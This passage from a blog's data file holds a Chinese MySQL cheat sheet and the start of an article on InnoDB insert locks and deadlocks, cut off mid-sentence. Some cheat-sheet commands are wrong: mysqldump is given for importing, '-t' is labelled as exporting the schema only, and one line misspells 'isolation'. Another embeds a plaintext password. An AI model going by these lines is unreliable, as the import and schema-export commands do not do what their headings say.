title=\"查看锁情况\"></a>查看锁情况</h2><p>表锁：show global status like ‘table_locks%’;<br>行锁：show global status like ‘innodb_row_lock%’;</p>\n<h2 id=\"文件打开数\"><a href=\"#文件打开数\" class=\"headerlink\" title=\"文件打开数\"></a>文件打开数</h2><p>show global status like ‘open_files’;</p>\n<h2 id=\"查看慢查询\"><a href=\"#查看慢查询\" class=\"headerlink\" title=\"查看慢查询\"></a>查看慢查询</h2><p>show full processlist;<br>SELECT * FROM information_schema.INNODB_TRX;<br>select @@autocommit;</p>\n<h2 id=\"设置对应的编码\"><a href=\"#设置对应的编码\" class=\"headerlink\" title=\"设置对应的编码\"></a>设置对应的编码</h2><p>set character_set_server=utf8;</p>\n<h2 id=\"查看数据库编码\"><a href=\"#查看数据库编码\" class=\"headerlink\" title=\"查看数据库编码\"></a>查看数据库编码</h2><p>SHOW VARIABLES LIKE ‘character%’;</p>\n<a id=\"more\"></a>\n<h2 id=\"查看日期毫秒数\"><a href=\"#查看日期毫秒数\" class=\"headerlink\" title=\"查看日期毫秒数\"></a>查看日期毫秒数</h2><p>select unix_timestamp(‘2009-10-26 10:06:07’);</p>\n<h2 id=\"查看日期\"><a href=\"#查看日期\" class=\"headerlink\" title=\"查看日期\"></a>查看日期</h2><p>select from_unixtime(1430211829676/1000);</p>\n<h2 id=\"查看表索引\"><a href=\"#查看表索引\" class=\"headerlink\" title=\"查看表索引\"></a>查看表索引</h2><p>show index from table;</p>\n<h2 id=\"查看数据库表字段\"><a href=\"#查看数据库表字段\" class=\"headerlink\" title=\"查看数据库表字段\"></a>查看数据库表字段</h2><p>select COLUMN_NAME from information_schema.COLUMNS<br>where table_name = ‘channel_movie’<br>and table_schema = ‘movie_ticket’;</p>\n<h2 id=\"数据库事务隔离级别\"><a href=\"#数据库事务隔离级别\" class=\"headerlink\" title=\"数据库事务隔离级别\"></a>数据库事务隔离级别</h2><h3 id=\"查看当前会话隔离级别\"><a href=\"#查看当前会话隔离级别\" class=\"headerlink\" title=\"查看当前会话隔离级别\"></a>查看当前会话隔离级别</h3><p>select @@tx_isolation;</p>\n<h3 id=\"查看系统当前隔离级别\"><a href=\"#查看系统当前隔离级别\" class=\"headerlink\" title=\"查看系统当前隔离级别\"></a>查看系统当前隔离级别</h3><p>select @@global.tx_isolation;</p>\n<h3 id=\"设置当前会话隔离级别\"><a href=\"#设置当前会话隔离级别\" class=\"headerlink\" title=\"设置当前会话隔离级别\"></a>设置当前会话隔离级别</h3><p>set session transaction isolatin level repeatable read;</p>\n<h3 id=\"设置系统当前隔离级别\"><a href=\"#设置系统当前隔离级别\" class=\"headerlink\" title=\"设置系统当前隔离级别\"></a>设置系统当前隔离级别</h3><p>set global transaction isolation level repeatable read;</p>\n<h2 id=\"显示数据表索引\"><a href=\"#显示数据表索引\" class=\"headerlink\" title=\"显示数据表索引\"></a>显示数据表索引</h2><p>show index from user_login_status;</p>\n<h2 id=\"删除重复数据（性能不佳）\"><a href=\"#删除重复数据（性能不佳）\" class=\"headerlink\" title=\"删除重复数据（性能不佳）\"></a>删除重复数据（性能不佳）</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> sql_safe_updates=<span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> netnews.item</div><div class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">id</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> (</div><div class=\"line\">     <span class=\"keyword\">select</span> <span class=\"keyword\">id</span> <span class=\"keyword\">from</span> (</div><div class=\"line\">          <span class=\"keyword\">select</span>  <span class=\"keyword\">min</span>(<span class=\"keyword\">id</span>) <span class=\"keyword\">as</span> <span class=\"keyword\">id</span> <span class=\"keyword\">from</span> netnews.item <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> channel_id, <span class=\"keyword\">link</span></div><div class=\"line\">     ) <span class=\"keyword\">as</span> tab</div><div class=\"line\">);</div><div class=\"line\"><span class=\"keyword\">set</span> sql_safe_updates=<span class=\"number\">1</span>;</div></pre></td></tr></table></figure>\n<h2 id=\"安全更新状态修改\"><a href=\"#安全更新状态修改\" class=\"headerlink\" title=\"安全更新状态修改\"></a>安全更新状态修改</h2><p>关闭：set sql_safe_updates=0;<br>打开：set sql_safe_updates=1;</p>\n<h2 id=\"查看mysql系统状态\"><a href=\"#查看mysql系统状态\" class=\"headerlink\" title=\"查看mysql系统状态\"></a>查看mysql系统状态</h2><p>show status<br>show processlist</p>\n<h2 id=\"临时修改内容显示字符集\"><a href=\"#临时修改内容显示字符集\" class=\"headerlink\" title=\"临时修改内容显示字符集\"></a>临时修改内容显示字符集</h2><p>charset utf8</p>\n<h2 id=\"修改索引\"><a href=\"#修改索引\" class=\"headerlink\" title=\"修改索引\"></a>修改索引</h2><p>ALTER TABLE <code>babel_idea</code>.<code>i_product_owner</code><br>DROP INDEX <code>name_UNIQUE</code> ,<br>ADD UNIQUE INDEX <code>unique_product_owner_name</code> (<code>name</code> ASC);</p>\n<h2 id=\"显示索引\"><a href=\"#显示索引\" class=\"headerlink\" title=\"显示索引\"></a>显示索引</h2><p>show index from i_product;</p>\n<h2 id=\"删除索引\"><a href=\"#删除索引\" class=\"headerlink\" title=\"删除索引\"></a>删除索引</h2><p>alter table i_product drop index fk_product_deleted_idx;</p>\n<h2 id=\"按条件导出mysql表数据\"><a href=\"#按条件导出mysql表数据\" class=\"headerlink\" title=\"按条件导出mysql表数据\"></a>按条件导出mysql表数据</h2><p><code>mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=&quot;id &gt;1000&quot; 表明&gt;导出文件名.sql</code></p>\n<h2 id=\"mysqldump数据导入\"><a href=\"#mysqldump数据导入\" class=\"headerlink\" title=\"mysqldump数据导入\"></a>mysqldump数据导入</h2><p>mysqldump babel_idea &lt; babel_idea.sql</p>\n<h2 id=\"启用safe-mode-update-delete-select操作需要包含主键的where条件\"><a href=\"#启用safe-mode-update-delete-select操作需要包含主键的where条件\" class=\"headerlink\" title=\"启用safe mode(update, delete, select操作需要包含主键的where条件)\"></a>启用safe mode(update, delete, select操作需要包含主键的where条件)</h2><p>set sql_safe_updates=1;</p>\n<h2 id=\"关闭safe-mode\"><a href=\"#关闭safe-mode\" class=\"headerlink\" title=\"关闭safe mode\"></a>关闭safe mode</h2><p>set sql_safe_updates=0;</p>\n<h2 id=\"修改表字段\"><a href=\"#修改表字段\" class=\"headerlink\" title=\"修改表字段\"></a>修改表字段</h2><p>alter table i_product<br>add column <code>deleted</code> tinyint not null<br>default 0<br>comment ‘逻辑删除，是否已删除(0: 未删除，1: 删除)’;</p>\n<h2 id=\"添加索引\"><a href=\"#添加索引\" class=\"headerlink\" title=\"添加索引\"></a>添加索引</h2><h3 id=\"添加单一索引\"><a href=\"#添加单一索引\" class=\"headerlink\" title=\"添加单一索引\"></a>添加单一索引</h3><p>alter table i_product<br>drop index <code>fk_product_product_idx</code>;</p>\n<h3 id=\"添加联合索引\"><a href=\"#添加联合索引\" class=\"headerlink\" title=\"添加联合索引\"></a>添加联合索引</h3><p>alter table i_product<br>add index <code>fk_product_id_parent_idx</code><br>(id, parent);</p>\n<h2 id=\"创建数据库-设置默认字符集\"><a href=\"#创建数据库-设置默认字符集\" class=\"headerlink\" title=\"创建数据库(设置默认字符集)\"></a>创建数据库(设置默认字符集)</h2><p>create database <code>babel_idea</code> DEFAULT CHARACTER SET utf8;</p>\n<h2 id=\"只导出数据库数据表结构\"><a href=\"#只导出数据库数据表结构\" class=\"headerlink\" title=\"只导出数据库数据表结构\"></a>只导出数据库数据表结构</h2><p>~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea &gt; ~/babel_idea.schema.sql</p>\n","excerpt":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"查看innodb引擎状态\"><a href=\"#查看innodb引擎状态\" class=\"headerlink\" title=\"查看innodb引擎状态\"></a>查看innodb引擎状态</h2><p>可用于查看死锁情况：<br>show engine innodb status;</p>\n<h2 id=\"查看锁情况\"><a href=\"#查看锁情况\" class=\"headerlink\" title=\"查看锁情况\"></a>查看锁情况</h2><p>表锁：show global status like ‘table_locks%’;<br>行锁：show global status like ‘innodb_row_lock%’;</p>\n<h2 id=\"文件打开数\"><a href=\"#文件打开数\" class=\"headerlink\" title=\"文件打开数\"></a>文件打开数</h2><p>show global status like ‘open_files’;</p>\n<h2 id=\"查看慢查询\"><a href=\"#查看慢查询\" class=\"headerlink\" title=\"查看慢查询\"></a>查看慢查询</h2><p>show full processlist;<br>SELECT * FROM information_schema.INNODB_TRX;<br>select @@autocommit;</p>\n<h2 id=\"设置对应的编码\"><a href=\"#设置对应的编码\" class=\"headerlink\" title=\"设置对应的编码\"></a>设置对应的编码</h2><p>set character_set_server=utf8;</p>\n<h2 id=\"查看数据库编码\"><a href=\"#查看数据库编码\" class=\"headerlink\" title=\"查看数据库编码\"></a>查看数据库编码</h2><p>SHOW VARIABLES LIKE ‘character%’;</p>","more":"<h2 id=\"查看日期毫秒数\"><a href=\"#查看日期毫秒数\" class=\"headerlink\" title=\"查看日期毫秒数\"></a>查看日期毫秒数</h2><p>select unix_timestamp(‘2009-10-26 10:06:07’);</p>\n<h2 id=\"查看日期\"><a href=\"#查看日期\" class=\"headerlink\" title=\"查看日期\"></a>查看日期</h2><p>select from_unixtime(1430211829676/1000);</p>\n<h2 id=\"查看表索引\"><a href=\"#查看表索引\" class=\"headerlink\" title=\"查看表索引\"></a>查看表索引</h2><p>show index from table;</p>\n<h2 id=\"查看数据库表字段\"><a href=\"#查看数据库表字段\" class=\"headerlink\" title=\"查看数据库表字段\"></a>查看数据库表字段</h2><p>select COLUMN_NAME from information_schema.COLUMNS<br>where table_name = ‘channel_movie’<br>and table_schema = ‘movie_ticket’;</p>\n<h2 id=\"数据库事务隔离级别\"><a href=\"#数据库事务隔离级别\" class=\"headerlink\" title=\"数据库事务隔离级别\"></a>数据库事务隔离级别</h2><h3 id=\"查看当前会话隔离级别\"><a href=\"#查看当前会话隔离级别\" class=\"headerlink\" title=\"查看当前会话隔离级别\"></a>查看当前会话隔离级别</h3><p>select @@tx_isolation;</p>\n<h3 id=\"查看系统当前隔离级别\"><a href=\"#查看系统当前隔离级别\" class=\"headerlink\" title=\"查看系统当前隔离级别\"></a>查看系统当前隔离级别</h3><p>select @@global.tx_isolation;</p>\n<h3 id=\"设置当前会话隔离级别\"><a href=\"#设置当前会话隔离级别\" class=\"headerlink\" title=\"设置当前会话隔离级别\"></a>设置当前会话隔离级别</h3><p>set session transaction isolatin level repeatable read;</p>\n<h3 id=\"设置系统当前隔离级别\"><a href=\"#设置系统当前隔离级别\" class=\"headerlink\" title=\"设置系统当前隔离级别\"></a>设置系统当前隔离级别</h3><p>set global transaction isolation level repeatable read;</p>\n<h2 id=\"显示数据表索引\"><a href=\"#显示数据表索引\" class=\"headerlink\" title=\"显示数据表索引\"></a>显示数据表索引</h2><p>show index from user_login_status;</p>\n<h2 id=\"删除重复数据（性能不佳）\"><a href=\"#删除重复数据（性能不佳）\" class=\"headerlink\" title=\"删除重复数据（性能不佳）\"></a>删除重复数据（性能不佳）</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> sql_safe_updates=<span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> netnews.item</div><div class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">id</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> (</div><div class=\"line\">     <span class=\"keyword\">select</span> <span class=\"keyword\">id</span> <span class=\"keyword\">from</span> (</div><div class=\"line\">          <span class=\"keyword\">select</span>  <span class=\"keyword\">min</span>(<span class=\"keyword\">id</span>) <span class=\"keyword\">as</span> <span class=\"keyword\">id</span> <span class=\"keyword\">from</span> netnews.item <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> channel_id, <span class=\"keyword\">link</span></div><div class=\"line\">     ) <span class=\"keyword\">as</span> tab</div><div class=\"line\">);</div><div class=\"line\"><span class=\"keyword\">set</span> sql_safe_updates=<span class=\"number\">1</span>;</div></pre></td></tr></table></figure>\n<h2 id=\"安全更新状态修改\"><a href=\"#安全更新状态修改\" class=\"headerlink\" title=\"安全更新状态修改\"></a>安全更新状态修改</h2><p>关闭：set sql_safe_updates=0;<br>打开：set sql_safe_updates=1;</p>\n<h2 id=\"查看mysql系统状态\"><a href=\"#查看mysql系统状态\" class=\"headerlink\" title=\"查看mysql系统状态\"></a>查看mysql系统状态</h2><p>show status<br>show processlist</p>\n<h2 id=\"临时修改内容显示字符集\"><a href=\"#临时修改内容显示字符集\" class=\"headerlink\" title=\"临时修改内容显示字符集\"></a>临时修改内容显示字符集</h2><p>charset utf8</p>\n<h2 id=\"修改索引\"><a href=\"#修改索引\" class=\"headerlink\" title=\"修改索引\"></a>修改索引</h2><p>ALTER TABLE <code>babel_idea</code>.<code>i_product_owner</code><br>DROP INDEX <code>name_UNIQUE</code> ,<br>ADD UNIQUE INDEX <code>unique_product_owner_name</code> (<code>name</code> ASC);</p>\n<h2 id=\"显示索引\"><a href=\"#显示索引\" class=\"headerlink\" title=\"显示索引\"></a>显示索引</h2><p>show index from i_product;</p>\n<h2 id=\"删除索引\"><a href=\"#删除索引\" class=\"headerlink\" title=\"删除索引\"></a>删除索引</h2><p>alter table i_product drop index fk_product_deleted_idx;</p>\n<h2 id=\"按条件导出mysql表数据\"><a href=\"#按条件导出mysql表数据\" class=\"headerlink\" title=\"按条件导出mysql表数据\"></a>按条件导出mysql表数据</h2><p><code>mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=&quot;id &gt;1000&quot; 表明&gt;导出文件名.sql</code></p>\n<h2 id=\"mysqldump数据导入\"><a href=\"#mysqldump数据导入\" class=\"headerlink\" title=\"mysqldump数据导入\"></a>mysqldump数据导入</h2><p>mysqldump babel_idea &lt; babel_idea.sql</p>\n<h2 id=\"启用safe-mode-update-delete-select操作需要包含主键的where条件\"><a href=\"#启用safe-mode-update-delete-select操作需要包含主键的where条件\" class=\"headerlink\" title=\"启用safe mode(update, delete, select操作需要包含主键的where条件)\"></a>启用safe mode(update, delete, select操作需要包含主键的where条件)</h2><p>set sql_safe_updates=1;</p>\n<h2 id=\"关闭safe-mode\"><a href=\"#关闭safe-mode\" class=\"headerlink\" title=\"关闭safe mode\"></a>关闭safe mode</h2><p>set sql_safe_updates=0;</p>\n<h2 id=\"修改表字段\"><a href=\"#修改表字段\" class=\"headerlink\" title=\"修改表字段\"></a>修改表字段</h2><p>alter table i_product<br>add column <code>deleted</code> tinyint not null<br>default 0<br>comment ‘逻辑删除，是否已删除(0: 未删除，1: 删除)’;</p>\n<h2 id=\"添加索引\"><a href=\"#添加索引\" class=\"headerlink\" title=\"添加索引\"></a>添加索引</h2><h3 id=\"添加单一索引\"><a href=\"#添加单一索引\" class=\"headerlink\" title=\"添加单一索引\"></a>添加单一索引</h3><p>alter table i_product<br>drop index <code>fk_product_product_idx</code>;</p>\n<h3 id=\"添加联合索引\"><a href=\"#添加联合索引\" class=\"headerlink\" title=\"添加联合索引\"></a>添加联合索引</h3><p>alter table i_product<br>add index <code>fk_product_id_parent_idx</code><br>(id, parent);</p>\n<h2 id=\"创建数据库-设置默认字符集\"><a href=\"#创建数据库-设置默认字符集\" class=\"headerlink\" title=\"创建数据库(设置默认字符集)\"></a>创建数据库(设置默认字符集)</h2><p>create database <code>babel_idea</code> DEFAULT CHARACTER SET utf8;</p>\n<h2 id=\"只导出数据库数据表结构\"><a href=\"#只导出数据库数据表结构\" class=\"headerlink\" title=\"只导出数据库数据表结构\"></a>只导出数据库数据表结构</h2><p>~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea &gt; ~/babel_idea.schema.sql</p>"},{"title":"mysql insert锁机制","date":"2016-07-28T02:05:00.000Z","_content":"<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n上周遇到一个因insert而引发的死锁问题，其成因比较令人费解。\n于是想要了解一下insert加锁机制，但是发现网上介绍的文章比较少且零散，挖掘过程比较忙乱。\n\n本以为只需要系统学习一个较完全的逻辑，但是实际牵扯很多innodb锁相关知识及加锁方式。我好像并没有那么大的能耐，把各种场景的加锁过程一一列举并加之分析；亦没有太多的精力验证网上的言论的准确性。\n\n只好根据现在了解的内容，参考官方文档，说说自己当前的理解。\n本文仅供参考，如有误导，概不负责。\n\n\n## 二、现场状态\n不同的mysql版本，不同的参数设置，都可能对加锁过程有影响。\n分析加锁机制还是应当尽可能多地列举一下关键参数，例如：当前mysql版本、事务隔离级别等。\n如下，仅仅只列出个别比较重要的参数。\n\n### 1.数据库版本\n``` bash\nmysql> select version();\n+-----------+\n| version() |\n+-----------+\n| 5.6.27    |\n+-----------+\n```\n\n### 2. 数据库引擎\n``` bash\nmysql> show variables like '%engine%';\n+----------------------------+--------+\n| Variable_name              | Value  |\n+----------------------------+--------+\n| default_storage_engine     | InnoDB |\n| default_tmp_storage_engine | InnoDB |\n| storage_engine             | InnoDB |\n+----------------------------+--------+\n```\n\n**注**：InnoDB支持事务，Myisam不支持事务；InnoDB支持行锁和表锁；Myisam不支持行锁。\n\n### 3. 事务隔离级别\n``` bash\nmysql> select @@global.tx_isolation, @@session.tx_isolation, @@tx_isolation;\n+-----------------------+------------------------+-----------------+\n| @@global.tx_isolation | @@session.tx_isolation | @@tx_isolation  |\n+-----------------------+------------------------+-----------------+\n| REPEATABLE-READ       | REPEATABLE-READ        | REPEATABLE-READ |\n+-----------------------+------------------------+-----------------+\n```\n\n**注**：几种事务隔离级别：READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE\n\n### 4. 查看gap锁开启状态\n``` bash\nmysql> show variables like 'innodb_locks_unsafe_for_binlog';\n+--------------------------------+-------+\n| Variable_name                  | Value |\n+--------------------------------+-------+\n| innodb_locks_unsafe_for_binlog | OFF   |\n+--------------------------------+-------+\n```\n\ninnodb_locks_unsafe_for_binlog：默认值为0，即启用gap lock。\n最主要的作用就是控制innodb是否对gap加锁。\n但是，这一设置变更并不影响外键和唯一索引（含主键）对gap进行加锁的需要。\n开启innodb_locks_unsafe_for_binlog的REPEATABLE-READ事务隔离级别，很大程度上已经蜕变成了READ-COMMITTED。\n\n参见官方文档[^1]：\n> By default, the value of innodb_locks_unsafe_for_binlog is 0 (disabled), which means that gap locking is enabled: InnoDB uses next-key locks for searches and index scans. To enable the variable, set it to 1. This causes gap locking to be disabled: InnoDB uses only index-record locks for searches and index scans.\n\n> Enabling innodb_locks_unsafe_for_binlog does not disable the use of gap locking for foreign-key constraint checking or duplicate-key checking.\n\n> The effect of enabling innodb_locks_unsafe_for_binlog is similar to but not identical to setting the transaction isolation level to READ COMMITTED.\n\n\n### 5. 查看自增锁模式\n``` bash\nmysql> show variables like 'innodb_autoinc_lock_mode';\n+--------------------------+-------+\n| Variable_name            | Value |\n+--------------------------+-------+\n| innodb_autoinc_lock_mode | 1     |\n+--------------------------+-------+\n```\n\ninnodb_autoinc_lock_mode有3种配置模式：0、1、2，分别对应\"传统模式\", \"连续模式\", \"交错模式\"。[^8]\n传统模式：涉及auto-increment列的插入语句加的表级AUTO-INC锁，只有插入执行结束后才会释放锁。这是一种兼容MySQL 5.1之前版本的策略。\n连续模式：可以事先确定插入行数的语句(包括单行和多行插入)，分配连续的确定的auto-increment值；对于插入行数不确定的插入语句，仍加表锁。这种模式下，事务回滚，auto-increment值不会回滚，换句话说，自增列内容会不连续。\n交错模式：同一时刻多条SQL语句产生交错的auto-increment值。\n\n由于insert语句常常涉及自增列的加锁过程，会涉及到AUTO-INC Locks加锁过程。\n为了分步了解insert加锁过程，本文暂不讨论任何涉及自增列的加锁逻辑。\n这一参数设置相关内容可能会出现在我的下一篇文章里。\n\n<!-- more -->\n\n### n. etc\n相关的参数配置越详情越好。\n\n\n## 三、InnoDB锁类型[^2]\n\n### 1. 基本锁\n基本锁：共享锁(Shared Locks：S锁)与排他锁(Exclusive Locks：X锁)\n\nmysql允许拿到S锁的事务读一行，允许拿到X锁的事务更新或删除一行。\n加了S锁的记录，允许其他事务再加S锁，不允许其他事务再加X锁；\n加了X锁的记录，不允许其他事务再加S锁或者X锁。\n\nmysql对外提供加这两种锁的语法如下：\n加S锁：select...lock in share mode\n加X锁：select...for update\n\n### 2. 意向锁(Intention Locks)\nInnoDB为了支持多粒度(表锁与行锁)的锁并存，引入意向锁。\n意向锁是表级锁，可分为意向共享锁(IS锁)和意向排他锁(IX锁)。\n> InnoDB supports multiple granularity locking which permits coexistence of row-level locks and locks on entire tables. To make locking at multiple granularity levels practical, additional types of locks called intention locks are used. Intention locks are table-level locks in InnoDB that indicate which type of lock (shared or exclusive) a transaction will require later for a row in that table. There are two types of intention locks used in InnoDB (assume that transaction T has requested a lock of the indicated type on table t):\n> Intention shared (IS): Transaction T intends to set S locks on individual rows in table t.\n> Intention exclusive (IX): Transaction T intends to set X locks on those rows.\n\n\n事务在请求S锁和X锁前，需要先获得对应的IS、IX锁。\n> Before a transaction can acquire an S lock on a row in table t, it must first acquire an IS or stronger lock on t. Before a transaction can acquire an X lock on a row, it must first acquire an IX lock on t.\n\n\n意向锁产生的主要目的是为了处理行锁和表锁之间的冲突，用于表明“某个事务正在某一行上持有了锁，或者准备去持有锁”。\n> The main purpose of IX and IS locks is to show that someone is locking a row, or going to lock a row in the table.\n\n\n共享锁、排他锁与意向锁的兼容矩阵如下：\n\n| | X | IX | S | IS |\n|:---:|:---:|:---:|:---:|:---:|\n| X | `冲突` | `冲突` | `冲突` | `冲突` |\n| IX | `冲突` | 兼容 | `冲突` | 兼容 |\n| S | `冲突` | `冲突` | 兼容 | 兼容 |\n| IS | `冲突` | 兼容 | 兼容 | 兼容 |\n\n#### 思考\n从官方文档字面意思上看意向锁是表级锁，但是大牛**不认为**“Intention lock 是表级锁”[^5]?\n另外，由于意向锁主要用于解决行锁与表锁间冲突问题，鉴于平时表级操作特别少，在分析加锁过程是否可以不用过多考虑意向锁的问题?\n\n\n### 3. 行锁\n\n#### 记录锁(Record Locks)\n记录锁, 仅仅锁住索引记录的一行。\n单条索引记录上加锁，record lock锁住的永远是索引，而非记录本身，即使该表上没有任何索引，那么innodb会在后台创建一个隐藏的聚集主键索引，那么锁住的就是这个隐藏的聚集主键索引。所以说当一条sql没有走任何索引时，那么将会在每一条聚集索引后面加X锁，这个类似于表锁，但原理上和表锁应该是完全不同的。\n\n参见官方文档[^3]：\n> If the table has no PRIMARY KEY or suitable UNIQUE index, InnoDB internally generates a hidden clustered index on a synthetic column containing row ID values. The rows are ordered by the ID that InnoDB assigns to the rows in such a table. The row ID is a 6-byte field that increases monotonically as new rows are inserted. Thus, the rows ordered by the row ID are physically in insertion order.\n\n\n#### 间隙锁(Gap Locks)\n区间锁, 仅仅锁住一个索引区间(开区间)。\n在索引记录之间的间隙中加锁，或者是在某一条索引记录之前或者之后加锁，并不包括该索引记录本身。\n\n\n#### next-key锁(Next-Key Locks)\nrecord lock + gap lock, 左开右闭区间。\n> A next-key lock is a combination of a record lock on the index record and a gap lock on the gap before the index record.\n\n> By default, InnoDB operates in REPEATABLE READ transaction isolation level and with the innodb_locks_unsafe_for_binlog system variable disabled. In this case, InnoDB uses next-key locks for searches and index scans, which prevents phantom rows。\n\n默认情况下，innodb使用next-key locks来锁定记录。\n但当查询的索引含有唯一属性的时候，Next-Key Lock 会进行优化，将其降级为Record Lock，即仅锁住索引本身，不是范围。\n\n\n#### 插入意向锁(Insert Intention Locks)\nGap Lock中存在一种插入意向锁（Insert Intention Lock），在insert操作时产生。在多事务同时写入不同数据至同一索引间隙的时候，并不需要等待其他事务完成，不会发生锁等待。\n假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。\n\n> An insert intention lock is a type of gap lock set by INSERT operations prior to row insertion. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6, respectively, each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.\n\n**注**：插入意向锁并非意向锁，而是一种特殊的间隙锁。\n\n### 4. 行锁的兼容矩阵[^4]\n| | Gap | Insert Intention| Record  | Next-Key |\n|---|---|---|---|---|\n| **Gap** | 兼容 | 兼容 | 兼容 | 兼容 |\n| **Insert Intention** | `冲突` | 兼容 | 兼容 | `冲突` |\n| **Record** | 兼容 | 兼容 | `冲突` | `冲突` |\n| **Next-Key** | 兼容 | 兼容 | `冲突` | `冲突` |\n\n**表注**：横向是已经持有的锁，纵向是正在请求的锁。\n\n由于S锁和S锁是完全兼容的，因此在判别兼容性时只考虑持有的锁与请求的锁是这三种组合情形：X、S和S、X和X、X。\n另外，需要提醒注意的是进行兼容判断也只是针对于加锁涉及的行有交集的情形。\n\n分析兼容矩阵可以得出如下几个结论：\n- INSERT操作之间不会有冲突。\n- GAP,Next-Key会阻止Insert。\n- GAP和Record,Next-Key不会冲突\n- Record和Record、Next-Key之间相互冲突。\n- 已有的Insert锁不阻止任何准备加的锁。\n\n\n### 5. 自增锁(AUTO-INC Locks)\nAUTO-INC锁是一种特殊的表级锁，发生涉及AUTO_INCREMENT列的事务性插入操作时产生。\n\n官方解释如下[^3]：\n> An AUTO-INC lock is a special table-level lock taken by transactions inserting into tables with AUTO_INCREMENT columns. In the simplest case, if one transaction is inserting values into the table, any other transactions must wait to do their own inserts into that table, so that rows inserted by the first transaction receive consecutive primary key values.\n\n## 四、insert加锁过程\n官方文档[^6]对于insert加锁的描述如下：\n> INSERT sets an exclusive lock on the inserted row. This lock is an index-record lock, not a next-key lock (that is, there is no gap lock) and does not prevent other sessions from inserting into the gap before the inserted row.\n\n> Prior to inserting the row, a type of gap lock called an insert intention gap lock is set. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6 each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.\n\n> If a duplicate-key error occurs, a shared lock on the duplicate index record is set. This use of a shared lock can result in deadlock should there be multiple sessions trying to insert the same row if another session already has an exclusive lock.\n\n简单的insert会在insert的行对应的索引记录上加一个排它锁，这是一个record lock，并没有gap，所以并不会阻塞其他session在gap间隙里插入记录。\n\n不过在insert操作之前，还会加一种锁，官方文档称它为insertion intention gap lock，也就是意向的gap锁。这个意向gap锁的作用就是预示着当多事务并发插入相同的gap空隙时，只要插入的记录不是gap间隙中的相同位置，则无需等待其他session就可完成，这样就使得insert操作无须加真正的gap lock。\n假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。\n\n假设发生了一个唯一键冲突错误，那么将会在重复的索引记录上加读锁。当有多个session同时插入相同的行记录时，如果另外一个session已经获得该行的排它锁，那么将会导致死锁。\n\n\n### 思考：Insert Intention Locks作用\nInsert Intention Locks的引入，我理解是为了提高数据插入的并发能力。\n如果没有Insert Intention Locks的话，可能就需要使用Gap Locks来代替。\n\n\n## 五、insert死锁场景分析\n接下来，带大家看几个与insert相关的死锁场景。\n\n### 1. duplicate key error引发的死锁\n这个场景主要发生在两个以上的事务同时进行唯一键值相同的记录插入操作。\n\n\n#### 表结构\n``` sql\nCREATE TABLE `aa` (\n  `id` int(10) unsigned NOT NULL COMMENT '主键',\n  `name` varchar(20) NOT NULL DEFAULT '' COMMENT '姓名',\n  `age` int(11) NOT NULL DEFAULT '0' COMMENT '年龄',\n  `stage` int(11) NOT NULL DEFAULT '0' COMMENT '关卡数',\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `udx_name` (`name`),\n  KEY `idx_stage` (`stage`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n\n#### 表数据\n``` bash\nmysql> select * from aa;\n+----+------+-----+-------+\n| id | name | age | stage |\n+----+------+-----+-------+\n|  1 | yst  |  11 |     8 |\n|  2 | dxj  |   7 |     4 |\n|  3 | lb   |  13 |     7 |\n|  4 | zsq  |   5 |     7 |\n|  5 | lxr  |  13 |     4 |\n+----+------+-----+-------+\n```\n\n\n#### 事务执行时序表\n| T1(36727) | T2(36728) | T3(36729) |\n|---|---|---|\n| begin; | begin; | begin; |\n| insert into aa values(6, 'test', 12, 3); | | |\n| | insert into aa values(6, 'test', 12, 3); | |\n| | | insert into aa values(6, 'test', 12, 3); |\n| rollback; | | |\n| | | ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction |\n| | Query OK, 1 row affected (13.10 sec) | &nbsp; |\n\n如果T1未rollback，而是commit的话，T2和T3会报唯一键冲突：ERROR 1062 (23000): Duplicate entry '6' for key 